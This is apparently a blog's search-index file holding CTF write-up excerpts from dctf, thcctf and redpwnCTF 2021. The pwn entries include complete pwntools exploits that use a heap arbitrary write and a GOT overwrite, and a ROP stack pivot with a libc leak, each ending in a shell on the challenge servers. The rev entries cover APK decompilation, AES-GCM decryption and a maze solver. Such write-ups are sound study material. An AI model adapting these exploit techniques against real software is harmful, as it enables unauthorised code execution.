var store = [{
        "title": "2021 dctf write-up",
        "excerpt":"Tasks      PwnğŸ’»            Just Another Heap (500pts)           Just Another Heap (500pts)   I couldnâ€™t solve this one prob in time, but I want to post this solving skills. Itâ€™s hard to find, but when I found it, Itâ€™s very simple Arbitrary Write.         It has 5 user functions(create, relive, forget, change, listing).   create() has a role that makes malloc_frame(0x20) and  malloc_userinput(size). The point is, this prob has a unique fading input with this part.   puts(\"How long is your memory\"); input_lu(&amp;size);                          // no size check malloc_user = malloc(size);               // size &gt; 0x308 / forget -&gt; unsorted bin puts(\"Sometimes our memories fade and we only remember parts of them.\"); input_lu(&amp;fade);                          // no filter puts(\"Would you like to leave some space at the beginning in case you remember later?\"); if ( fade &lt;= size ) {   if ( malloc_user )   {     for ( i = 0; i &lt; fade; ++i )       malloc_user[i] = '_';   }   malloc_user += fade;   memories will be faded fade bytes with _, and user input is behind the _ strings if malloc_user is NOT 0. So, if malloc(size) returns 0, I can overwrite anywhere.   Exploit   First, set chunks that size&gt;0x408 between 2 small chunks to leak libc from main_arena+xx.   And make 1 tcache and 0x410 unsorted bin. Now main_arena+xx has written in unsorted bin.   and if I rewrite and use change() to fill fade bytes and get libc addr with relive() function.      change() function : overwrite from the beginning or behind fade _ strings   relive() function : print user input with fade _ string   Finally, Use This mentioned skills to do GOT Overwriting.      memories will be faded fade bytes with _, and user input is behind the _ strings if malloc_user is NOT 0. So, if malloc(size) returns 0, I can overwrite anywhere.    input /bin/sh\\x00 in malloc_frame[] and program will call strcspn(addr,'\\n'). Get The Shell.   Code   Here is the Exploit Code.   from pwn import *  context.log_level='debug'  def create(idx, name, size, hide, cont, important, recent):   p.recv()   p.sendline(str(1))   p.recv()   p.sendline(str(idx))   p.recv()   p.sendline(name)   p.recv()   p.sendline(str(size))   p.recv()   p.sendline(str(hide))   p.recv()   p.sendline(cont)   p.recv()   p.sendline(important)   p.recv()   p.sendline(recent)  def relive(idx):   p.recv()   p.sendline(str(2))   p.recv()   p.sendline(str(idx))  def change(idx, cont):   p.recv()   p.sendline(str(4))   p.recv()   p.sendline(str(idx))   p.recv()   p.sendline(\"Y\")   p.recv()   p.send(cont)  def forget(idx):   p.recv()   p.sendline(str(3))   p.recv()   p.sendline(str(idx))  def listing():   p.recv()   p.sendline(str(5))  p=remote(\"dctf-chall-just-another-heap.westeurope.azurecontainer.io\", 7481) #p=process(\"./just_another_heap\") e=ELF(\"./just_another_heap\") l=e.libc  create(0, \"A\"*8, 0x20, 0, \"1234\", \"N\", \"N\") create(1, \"B\"*8, 0x410, 0, \"1234\", \"N\", \"N\") create(2, \"A\"*8, 0x20, 0, \"1234\", \"N\", \"N\") forget(0) forget(1) #pause() create(3, \"B\"*8, 0x410, 6, \"\", \"N\", \"N\") #pause() change(3,\"A\"*8) relive(3)  p.recvuntil(\"A\"*7+\" \") libc_base=u64(p.recv(6).ljust(8,'\\x00'))-0x3ebca0  print hex(libc_base)  create(4, \"C\"*8, libc_base, e.got['strcspn'], p64(libc_base+l.sym['system']), \"N\", \"N\") pause() p.recv() p.sendline(str(1)) p.recv() p.sendline(\"//bin/sh\\x00\") p.interactive()  ","categories": ["ctf"],
        "tags": [],
        "url": "/ctf/dctf_2021_just_another_heap/",
        "teaser": null
      },{
        "title": "2021 thcctf write-up",
        "excerpt":"Tasks      PwnğŸ’»            Tourniquet (249pts)           RevğŸ”            Mission Impossible (246pts)           Tourniquet (Pwn, 249pts)      This is stack pivot problem without overwriting RET. First, our team planned to input more than 0x48 bytes to overwrite RET.   But, it has a constraint:      fgets(size, buf, stdin) set arguments from stdin to size.. so I canâ€™t call containing stdin.   Should bruteforce(1/16) to get correct stack pointer.   Must do stack pivot until I find a writable memory after leaking libc.   So, I just DO STACK PIVOT 3 times, and find ONE 8byte memory.   The following process is my idea to get shell..      Overwrite one byte of SFP to \\x00 using fgets() functionâ€™s \\n + \\x00.   Bruteforce correct position of RBP. and ROP with puts to get libc.   stack pivot to main(mov rbp, rsp) twice (my solution in competition).(â€» To go __start is another solution to get many memories that I can use for next ROP.)   find one_gadget with strings and objdump command because gem one_gadget couldâ€™t get shell on remote.   Get Shell.   Here is my payload.   from pwn import * context.log_level='debug' #context.terminal=['tmux','splitw','-h'] e=ELF(\"./tourniquet\") libc=ELF(\"./libc.so.6\") #libc=e.libc pRdi=0x00000000004006d3 pRsi_r15=0x00000000004006d1 main=e.sym['main'] puts_got=e.got['puts'] puts_plt=e.plt['puts'] setvbuf_got=e.got['setvbuf'] rdx_offset=0x0000000000001b92 pppr=0x00000000004006cc bss=0x601100 fgets=e.plt['fgets']  pay=p64(0x601100+0x40)+p64(pRdi)+p64(setvbuf_got)+p64(puts_plt)+p64(0x400627)+p64(0x601100+0x40)+p64(0x400627)+\"\\x00\"*7  while True:   try:     p=remote(\"remote2.thcon.party\", 10901)     #p=process(\"./tourniquet\")     p.sendlineafter(\"haha i'm unhackable right ?\\n\",pay)     leak=p.recvuntil(\"\\x7f\",timeout=1).ljust(8,'\\x00')     if '\\x7f' not in leak:       p.close()       continue     base=u64(leak)-libc.sym['setvbuf']     rdx=base+rdx_offset     stdin=base+libc.sym['_IO_2_1_stdin_']     one_gadget=base+0xe5418     print hex(base)     break     #pay=p64(0x4004c6)*2+p64(07+............x00000000004004c6)+p64(pRdi)+p64(setvbuf_got)+p64(puts_plt)+p64(main)+\"A\"*7   except:     p.close()     continue  pause() p.recv() p.sendline(\"1234\")  pay=p64(0)*5+p64(0x1234)+p64(one_gadget) pay=pay.ljust(0x3f,'\\x00')  p.recv() p.sendline(pay)  p.interactive()   Mission Impossible (Rev, 246pts)      extract apk and convert dex to jar using dex2jar tools.   Thereâ€™s nothing â€¦.:(   find hidden dex files in `MissionImpossibleTheme.mp3.   Get this Code with jd-gui.   package thcon21.ctf.payload;  import android.util.Base64; import java.io.UnsupportedEncodingException; import java.security.InvalidAlgorithmParameterException; import java.security.InvalidKeyException; import java.security.NoSuchAlgorithmException; import javax.crypto.BadPaddingException; import javax.crypto.Cipher; import javax.crypto.IllegalBlockSizeException; import javax.crypto.NoSuchPaddingException; import javax.crypto.spec.GCMParameterSpec; import javax.crypto.spec.SecretKeySpec;  public class MIRead {   private static final String CIPHER_ALGO = \"AES/GCM/NoPadding\";   private static final String IV = \"your_m1ssi0n\";   private static final String KEY = \"d0_you_acc3pt_it\";   private Cipher cipher = Cipher.getInstance(\"AES/GCM/NoPadding\");   private GCMParameterSpec parameterSpec = new GCMParameterSpec(128, \"your_m1ssi0n\".getBytes(\"utf-8\"));   private SecretKeySpec secretKeySpec = new SecretKeySpec(\"d0_you_acc3pt_it\".getBytes(\"utf-8\"), \"AES\");      public MIRead()     throws NoSuchPaddingException, NoSuchAlgorithmException, UnsupportedEncodingException   {}      public String decrypt(String paramString)     throws UnsupportedEncodingException, BadPaddingException, IllegalBlockSizeException, InvalidAlgorithmParameterException, InvalidKeyException   {     paramString = Base64.decode(paramString.getBytes(\"UTF-8\"), 0);     this.cipher.init(2, this.secretKeySpec, this.parameterSpec);     return new String(this.cipher.doFinal(paramString));   }      public String encrypt(String paramString)     throws UnsupportedEncodingException, BadPaddingException, IllegalBlockSizeException, InvalidAlgorithmParameterException, InvalidKeyException   {     this.cipher.init(1, this.secretKeySpec, this.parameterSpec);     return new String(Base64.encode(this.cipher.doFinal(paramString.getBytes(\"utf-8\")), 0));   } }   public static void main(String[] paramArrayOfString)   {     testFlag();     paramArrayOfString = paramArrayOfString[0];     while (0 != 0) {}     Object localObject = new StringBuilder();     ((StringBuilder)localObject).append(\"IkUegPuai+gfBce7nTf\");     if (\"IkUegPuai+gfBce7nTf\" != \"VEhDb24yMQo=\")     {       ((StringBuilder)localObject).append(\"CkMZzZSwne3X3mnyrc5oBcD2yGHUXy\");     }     else     {       ((StringBuilder)localObject).append(\"MissionImpossible\");       return;     }     ((StringBuilder)localObject).append(\"MMcjCaXX2AAY20H\");     localObject = ((StringBuilder)localObject).toString();     if (paramArrayOfString.equals(\"MissionImpossible\")) {       System.out.println((String)localObject);     }   }   The secret code is IkUegPuai+gfBce7nTfCkMZzZSwne3X3mnyrc5oBcD2yGHUXyMMcjCaXX2AAY20H. Then, how to decrypt? â†’ this file uses AES/GCM/NoPadding Mode. So I find python code in google. So I modified code and get flag.   from Crypto.Cipher import AES import base64  def print_hex_bytes(name, byte_array):     print('{} len[{}]: '.format(name, len(byte_array)), end='')     for idx, c in enumerate(byte_array):         print(\"{:02x}\".format(int(c)), end='')     print(\"\")  def dec(key, aad, nonce, cipher_data, mac):     print('\\nenter dec function ---------------------------------')     cipher = AES.new(key, AES.MODE_GCM, nonce)      try:         plain_data = cipher.decrypt(cipher_data)         print_hex_bytes('plain_data', plain_data)         print('exit dec function ---------------------------------')               return plain_data      except ValueError:         print (\"Key incorrect\")         print('exit dec function ---------------------------------')         return None  if __name__ == \"__main__\":     key   = b\"d0_you_acc3pt_it\"     aad   = bytes([0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,0x09,0x0A,0x0B,0x0C,0x0D,0x0E]) #     nonce = b\"your_m1ssi0n\"      cipher_data  = base64.b64decode(b\"IkUegPuai+gfBce7nTfCkMZzZSwne3X3mnyrc5oBcD2yGHUXyMMcjCaXX2AAY20H\")     mac = bytes([0xb3, 0x5e, 0x5b, 0x00, 0xe4, 0x11, 0x54, 0x39, 0xa3, 0xf8, 0xf9, 0xfb, 0xa3, 0x75, 0xd5, 0xe8])         print_hex_bytes('key', key)     print_hex_bytes('aad', aad)     print_hex_bytes('nonce', nonce)     print_hex_bytes('cipher data', cipher_data)     print_hex_bytes('mac', mac)      result = dec(key, aad, nonce, cipher_data, mac)     if result is not None:         print('\\nDecrypted value:')         print_hex_bytes('\\tresult(plain data)', result)   /mnt/d/CTF_List/2021/thcctf/rev/mission_impossible master* â‡£ â¯ python3 ex.py key len[16]: 64305f796f755f6163633370745f6974 aad len[14]: 0102030405060708090a0b0c0d0e nonce len[12]: 796f75725f6d31737369306e cipher data len[48]: 22451e80fb9a8be81f05c7bb9d37c290c673652c277b75f79a7cab739a01703db2187517c8c31c8c26975f6000636d07 mac len[16]: b35e5b00e4115439a3f8f9fba375d5e8  enter dec function --------------------------------- plain_data len[48]: 5448436f6e32317b546831732d5761732d506f737331626c652d466f722d557d8c0cda62bc921356ee356da0fe457d63 exit dec function ---------------------------------  Decrypted value:         result(plain data) len[48]: 5448436f6e32317b546831732d5761732d506f737331626c652d466f722d557d8c0cda62bc921356ee356da0fe457d63  /mnt/d/CTF_List/2021/thcctf/rev/mission_impossible master* â‡£ â¯ python3 Python 3.8.5 (default, Jul 28 2020, 12:59:40)  [GCC 9.3.0] on linux Type \"help\", \"copyright\", \"credits\" or \"license\" for more information.   &gt;&gt;&gt; bytes.fromhex(\"5448436f6e32317b546831732d5761732d506f737331626c652d466f722d557d8c0cda62bc921356ee356da0fe457d63\") b'THCon21{Th1s-Was-Poss1ble-For-U}\\x8c\\x0c\\xdab\\xbc\\x92\\x13V\\xee5m\\xa0\\xfeE}c'  ","categories": ["ctf"],
        "tags": [],
        "url": "/ctf/thcctf_2021_pwn_rev/",
        "teaser": null
      },{
        "title": "2021 redpwnCTF write-up",
        "excerpt":"Tasks     Rev ğŸ”            bread-making (108 pts)       dimensionality (144 pts)           Web ğŸ§            cool (122 pts)           Rev/bread-making (108pts)  this prob has a lot of string data, so I just picked the right answer on each situation to get final flag.   Just analyze binary and submit sentences with right sequence.   from pwn import *  context.log_level='debug'  p=remote(\"mc.ax\", 31796)  a=[\"add flour\",   \"add yeast\",   \"add salt\",   \"add water\",   \"hide the bowl inside a box\",   \"wait 3 hours\",   \"work in the basement\",   \"preheat the toaster oven\",   \"set a timer on your phone\",   \"watch the bread bake\",   \"pull the tray out with a towel\",   \"unplug the oven\",   \"unplug the fire alarm\",   \"open the window\",   \"wash the sink\",   \"clean the counters\",   \"flush the bread down the toilet\",   \"get ready to sleep\",   \"close the window\",   \"replace the fire alarm\",   \"brush teeth and go to bed\" ]  for i in range(len(a)):     print(i)     p.recv()     p.sendline(a[i])  p.interactive()  The flag is flag{m4yb3_try_f0ccac1a_n3xt_t1m3???0r_dont_b4k3_br3ad_at_m1dnight}   Rev/dimensionality (144pts)   bool __fastcall check(char *a1, __int64 a2, int a3) {   int v3; // er8   __int64 v4; // rax   int v5; // er9   char v6; // al   char *v7; // rcx   int v8; // esi   bool result; // al   char v10; // r12    v3 = dword_408C * dword_408C * dword_408C; // dword_408C = 11   if ( v3 &gt; 0 )   {     v4 = 1LL;     while ( 1 )     {       v5 = v4;       if ( v3 == v4 )         break;       if ( *(&amp;unk_207F + ++v4) == 2 )       {         a3 = v5;         break;       }     }   }   v6 = *a1;   v7 = a1 + 1;   v8 = dword_408C * dword_408C;   if ( *a1 )   {     while ( 1 )     {       switch ( v6 )       {         case 'b':           v8 = -(dword_408C * dword_408C);           break;         case 'd':           v8 = dword_408C;           break;         case 'f':           v8 = dword_408C * dword_408C;           break;         case 'l':           v8 = -1;           break;         case 'r':           v8 = 1;           break;         case 'u':           v8 = -dword_408C;           break;         default:           break;       }       a3 += v8;       result = a3 &lt; 0 || a3 &gt; v3;       if ( result )         break;       v10 = byte_2080[a3];       if ( !v10 )         return result;       v6 = *v7++;       if ( !v6 )         goto LABEL_12;     }     result = 0;   }   else   {     v10 = byte_2080[a3]; LABEL_12:     result = v10 == 3;   }   return result; }   I found a map (in unk_207F) involved 0,1,2,3 digits.  When I analyzed this binary, i found the goal : escape maze with 6 commands from 2 to 3.  (using f,b,d,u,r,l)     f â†’ cur+121  b â†’ cur-121  d â†’ cur+11  u â†’ cur-11  r -&gt; cur+1  l -&gt; cur-1    this prob can input command string upto length 29bytes, so I have to find a way that escape efficiently.   The player is currently located at 2. It is only possible to go to 1 or 3 instead of 0 through the command, and since it is inefficient to go back the way it has already been done, so using the breadth-first search(BFS) algorithm can reduce the number of cases.   Hereâ€™s my payload and I found 6 answers of this prob in 0.5 sec. one of these answers should print correct flag.   from pwn import * a=[0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x2, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x1, 0x1, 0x1, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x1, 0x1, 0x1, 0x0, 0x1, 0x1, 0x1, 0x1, 0x1, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x1, 0x1, 0x1, 0x1, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x1, 0x1, 0x0, 0x1, 0x1, 0x1, 0x1, 0x1, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x1, 0x1, 0x1, 0x1, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x1, 0x1, 0x1, 0x0, 0x1, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x1, 0x1, 0x1, 0x1, 0x1, 0x0, 0x1, 0x1, 0x1, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x1, 0x1, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x1, 0x1, 0x1, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x1, 0x1, 0x1, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x1, 0x1, 0x1, 0x1, 0x0, 0x1, 0x1, 0x1, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x1, 0x1, 0x1, 0x1, 0x1, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x1, 0x1, 0x1, 0x1, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x1, 0x1, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x1, 0x1, 0x1, 0x1, 0x1, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x1, 0x0, 0x1, 0x1, 0x1, 0x0, 0x1, 0x1, 0x1, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x1, 0x0, 0x1, 0x1, 0x1, 0x1, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x1, 0x1, 0x0, 0x1, 0x1, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x1, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x1, 0x1, 0x0, 0x1, 0x1, 0x1, 0x0, 0x1, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x1, 0x1, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0]  cur=a.index(2) queue=[[cur,[cur]]] print queue st=0 en=1 while st&lt;en:   if a[queue[st][0]]==3:     print str(queue[st][1])   if 0 &lt;= queue[st][0]+1 &lt;= 1331 and (a[queue[st][0]+1]==1 or a[queue[st][0]+1]==3) and queue[st][0]+1 not in queue[st][1]:     if len(queue[st][1])==30:       pass     else:       temp=queue[st][1][:]       temp.append(queue[st][0]+1)       #print(queue[st][1])       queue.append([queue[st][0]+1, temp])       en+=1   if 0 &lt;= queue[st][0]-1 &lt;= 1331 and (a[queue[st][0]-1]==1 or a[queue[st][0]-1]==3) and queue[st][0]-1 not in queue[st][1]:     if len(queue[st][1])==30:       pass     else:       temp=queue[st][1][:]       temp.append(queue[st][0]-1)       #print(queue[st][1])       queue.append([queue[st][0]-1, temp])       en+=1   if 0 &lt;= queue[st][0]+11 &lt;= 1331 and (a[queue[st][0]+11]==1 or a[queue[st][0]+11]==3) and queue[st][0]+11 not in queue[st][1]:     if len(queue[st][1])==30:       pass     else:       temp=queue[st][1][:]       temp.append(queue[st][0]+11)       #print(queue[st][1])       queue.append([queue[st][0]+11, temp])       en+=1   if 0 &lt;= queue[st][0]-11 &lt;= 1331 and (a[queue[st][0]-11]==1 or a[queue[st][0]-11]==3) and queue[st][0]-11 not in queue[st][1]:     if len(queue[st][1])==30:       pass     else:       temp=queue[st][1][:]       temp.append(queue[st][0]-11)       #print(queue[st][1])       queue.append([queue[st][0]-11, temp])       en+=1   if 0 &lt;= queue[st][0]+121 &lt;= 1331 and (a[queue[st][0]+121]==1 or a[queue[st][0]+121]==3) and queue[st][0]+121 not in queue[st][1]:     if len(queue[st][1])==30:       pass     else:       temp=queue[st][1][:]       temp.append(queue[st][0]+121)       #print(queue[st][1])       queue.append([queue[st][0]+121, temp])       en+=1   if 0 &lt;= queue[st][0]-121 &lt;= 1331 and (a[queue[st][0]-121]==1 or a[queue[st][0]-121]==3) and queue[st][0]-121 not in queue[st][1]:     if len(queue[st][1])==30:       pass     else:       temp=queue[st][1][:]       temp.append(queue[st][0]-121)       #print(queue[st][1])       queue.append([queue[st][0]-121, temp])       en+=1   st+=1   #print st,en  the third answer is correct input to get flag.  #a=[84, 205, 206, 207, 328, 449, 448, 447, 446, 445, 566, 687, 698, 709, 830, 951, 952, 953, 1074, 1195, 1184, 1173, 1052, 931, 932, 933, 1054, 1175, 1296] #a=[84, 205, 206, 207, 328, 449, 448, 447, 568, 689, 688, 687, 698, 709, 830, 951, 952, 953, 1074, 1195, 1184, 1173, 1052, 931, 932, 933, 1054, 1175, 1296] 